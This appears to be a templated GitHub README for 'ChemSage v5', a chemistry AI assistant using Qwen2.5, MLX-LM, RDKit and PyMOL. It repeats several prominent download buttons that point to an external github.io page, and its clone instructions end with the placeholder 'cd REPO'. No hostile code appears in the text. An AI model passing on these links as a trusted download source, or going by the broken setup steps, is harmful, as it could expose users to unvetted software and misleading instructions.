# ChemSage v5 - Chemistry-aware AI assistant 2026

> **ChemSage is a local AI assistant built for chemistry work on Apple Silicon. Version 5 brings together retrieval, a fine-tuned language model, and live scientific tooling for drug discovery workflows.**

[![Platform](https://img.shields.io/badge/Platform-Apple%20Silicon-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v5-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/samedwardsfgp3732/chemsage-rdkit-pymol-ai?style=flat-square)](https://github.com/samedwardsfgp3732/chemsage-rdkit-pymol-ai)

---

<p align="center">
  <a href="https://samedwardsfgp3732.github.io/chemsage-rdkit-pymol-ai/">
    <img src="https://img.shields.io/badge/Download-ChemSage%20Latest-brightgreen?style=for-the-badge" alt="Download ChemSage">
  </a>
</p>

> **[Download ChemSage v5](https://samedwardsfgp3732.github.io/chemsage-rdkit-pymol-ai/)**

---

[Download Latest Build](https://samedwardsfgp3732.github.io/chemsage-rdkit-pymol-ai/)

---

## What ChemSage Does

ChemSage provides chemistry-aware assistance for drug discovery, medicinal chemistry, and cheminformatics tasks. Its retrieval-augmented generation pipeline works with a QLoRA-adapted Qwen2.5 model, so answers can incorporate private chemistry and biology collections while retaining domain-focused behavior.

The system is intended to run on Apple Silicon through MLX-LM. It also connects language-based analysis with scientific utilities: RDKit handles chemical validation and property calculations, while PyMOL supports visualization, structural investigation, docking review, and protein-ligand interaction analysis.

---

## Core Capabilities

- Ground answers in private chemistry and biology collections with retrieval-augmented generation
- Use a Qwen2.5 model adapted through QLoRA fine-tuning
- Perform local inference on Apple Silicon with MLX-LM
- Run RDKit operations for chemical calculations and SMILES checking
- Work with PyMOL for molecular visualization and structure analysis
- Examine docking results and interpret protein-ligand interactions
- Run chemistry-focused evaluation and dataset validation procedures
- Provide a web demonstration using Hugging Face ZeroGPU

---

## Getting Started

First, download the source and enter the project directory:

```bash
git clone https://github.com/samedwardsfgp3732/chemsage-rdkit-pymol-ai.git
cd REPO
```

Set up the Apple Silicon environment, then install the dependencies specified by the project configuration. This includes MLX-LM, RDKit, PyMOL, and the components supporting retrieval and model serving.

Once installation is complete, start the application's included entry point or demo. The project also includes configuration for an optional hosted demonstration through Hugging Face ZeroGPU.

---

## Working with ChemSage

A standard session can be organized as follows:

1. Launch the local inference application on an Apple Silicon Mac.
2. Submit a chemistry or biology question for retrieval-supported analysis.
3. Request SMILES validation or calculations for relevant chemical properties.
4. Investigate molecules, proteins, and interactions through RDKit and PyMOL.
5. Provide docking results and ask for an interpretation of protein-ligand contacts.
6. Use the chemistry-aware evaluation and validation datasets to review results.

Typical requests include:

- Verifying a SMILES string
- Examining molecular properties while triaging compounds
- Searching private research material through retrieval
- Reviewing protein-ligand interaction details
- Understanding docking output in its structural context

---

## Settings and Configuration

Project configuration files and environment settings control the model, retrieval data, tool integrations, and optional hosted-demo parameters. The following illustrates the main configuration areas:

```yaml
model:
  family: Qwen2.5
  adapter: QLoRA
  runtime: MLX-LM

retrieval:
  enabled: true
  corpus: ./data

tools:
  rdkit: true
  pymol: true
```

For complete option names and valid paths, follow the configuration examples included in the repository.

---

## System Requirements

- Apple Silicon hardware for local model inference
- A compatible macOS environment
- MLX-LM for running the model locally
- RDKit for cheminformatics calculations and validation
- PyMOL for visualization and structural analysis
- Access to the project's chemistry and biology corpora when retrieval is enabled
- Adequate local storage for models, datasets, and associated files
- Hugging Face ZeroGPU support for the optional web demo

---

## Frequently Asked Questions

### What kinds of users can benefit from ChemSage?

ChemSage is aimed at people working in drug discovery, medicinal chemistry, cheminformatics, molecular structure analysis, and related chemistry or biology research.

### Is local execution supported?

Yes. Local inference is provided for Apple Silicon systems through MLX-LM.

### What role does retrieval play?

The retrieval-augmented generation workflow connects responses to selected private chemistry and biology corpora. The corpus should be configured using the settings supplied with the repository.

### Are RDKit and PyMOL available as assistant tools?

Yes. ChemSage can execute RDKit and PyMOL workflows for chemical calculations, SMILES validation, molecular examination, and structural analysis.

### How can I move to a newer build?

Look for the newest release or build in the repository, update your local checkout, and check the related dependency and configuration notes before starting ChemSage again.

### What can I investigate when the application does not start?

Verify the Apple Silicon requirement, confirm that model assets are present, reinstall or check the required dependencies, and make sure corpus and tool paths are correct. The first configuration or runtime error in the project output is usually the most useful starting point.

### Where are project settings maintained?

Change settings in the repository's configuration files and environment variables. Model, retrieval, RDKit, PyMOL, and deployment values should remain consistent with the project's provided examples.

---

## Future Work

- Further develop chemistry-aware evaluation and dataset validation
- Broaden retrieval workflows for private scientific collections
- Enhance RDKit and PyMOL integrations
- Improve docking and protein-ligand interaction interpretation
- Continue supporting Apple Silicon local inference and ZeroGPU web deployment

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
